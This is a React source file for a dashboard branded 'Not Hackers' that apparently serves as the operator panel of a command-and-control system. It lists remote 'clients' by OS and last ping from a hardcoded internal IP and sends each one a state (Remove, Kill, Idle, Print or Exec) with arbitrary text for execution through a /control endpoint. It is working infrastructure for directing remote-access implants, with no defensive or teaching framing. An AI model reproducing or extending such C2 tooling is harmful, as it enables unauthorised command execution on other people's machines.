import './App.scss';
import {useEffect, useState} from "react";
import Select from 'react-select'

const ip = "http://10.21.205.159:8080";

const Navbar = () => {
  return (
    <div className={"navbar"}>
      <div className={"nav-left"}>
        <h3>Not Hackers</h3>
      </div>
      <div className={"nav-fill"}/>
      <div className={"nav-right"}></div>
    </div>
  )
}

const Client = ({data, onClick}) => {
  let os = "";
  switch (data.os) {
    case 0: {
      os = "OSX";
      break;
    }
    case 1: {
      os = "Unix";
      break;
    }
    case 2: {
      os = "Windows";
      break;
    }
    default: {
      os = "unknown";
    }
  }

  let last_ping = new Date(data.last_ping * 1000).toLocaleString();
  return (
    <tr className={"client"} onClick={() => onClick(data)}>
      <td>{os}</td>
      <td>{data.id}</td>
      <td>{last_ping}</td>
    </tr>
  );
}

const ClientList = ({clients, onClick}) => {
  return <div className={"clientList"}>
    <table>
      <tr>
        <th>OS</th>
        <th>ID</th>
        <th>Last Ping</th>
      </tr>
      {clients.map((c) => {
        return (
          <Client data={c} key={c.id} onClick={(c) => onClick(c)}/>
        );
      })}
    </table>
  </div>

}

const ClientSelect = ({clients, currentClient, onChange}) => {
  return (
    <Select className={"selector-container"} classNamePrefix={"selector"}
            options={clients.map((data) => {
              return {
                value: data,
                label: data.id
              }
            })}
            onChange={onChange}
            value={{
              label: currentClient.id,
              value: currentClient.id,
            }
            }
    />
  );
}

const StateEditor = ({state, value, onChange}) => {
  switch (state) {
    case 1:
    case 2: {
      return <textarea className={"stateEditorText"} value={value} onChange={d => onChange(d.target.value)}/>
    }
    case -2:
    case -1:
    case 0:
    default: {
      return <p>No editable data</p>
    }
  }
}

function fetchClients() {
  return fetch(ip + '/clients',
    {
      method: "GET"
    })
    .then(res => res.json())
    .then(data => data["data"])
    .then(data => {
      if (data === null) return [];
      return data.map(d => {
        return {
          "id": d.id,
          "last_ping": d.data.time,
          "os": d.data.os
        };
      })
    })
    .catch(err => {
      console.log(err.message);
    });
}

function sendTo(new_state, client, data) {
  let info = {
    id: client.id,
    new_state: new_state,
    data: data.split('\n'),
  }
  fetch(ip + '/control', {
    method: "POST",
    body: JSON.stringify(info),
  })
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => {
      console.log(err.message);
    });
}

function App() {
  const [clients, setClients] = useState([]);
  const [currentState, setCurrentState] = useState(0);
  const [currentClient, setCurrentClient] = useState({});
  const [currentData, setCurrentData] = useState("");
  useEffect(() => {
    fetchClients().then(c => setClients(c));
  }, []);

  return (
    <div className="App">
      <Navbar/>
      <h3>Clients</h3>
      <h3>Settings</h3>
      <ClientList clients={clients} onClick={(d) => {
        setCurrentClient(d);
      }}/>
      <div className={"clientOptions"}>
        <button className={"sendTo"} onClick={() => sendTo(currentState, currentClient, currentData)}
        >SEND
        </button>
        <ClientSelect clients={clients} currentClient={currentClient}
                      onChange={data => setCurrentClient(data["value"])}/>
        <Select className={"selector-container"} classNamePrefix={"selector"} options={[
          {value: -2, label: 'Remove'},
          {value: -1, label: 'Kill'},
          {value: 0, label: 'Idle'},
          {value: 1, label: 'Print'},
          {value: 2, label: 'Exec'},
        ]} onChange={state => setCurrentState(state["value"])} value={currentState}/>
        <StateEditor state={currentState} value={currentData} onChange={d => setCurrentData(d)}/>
      </div>
    </div>
  );
}

export default App;
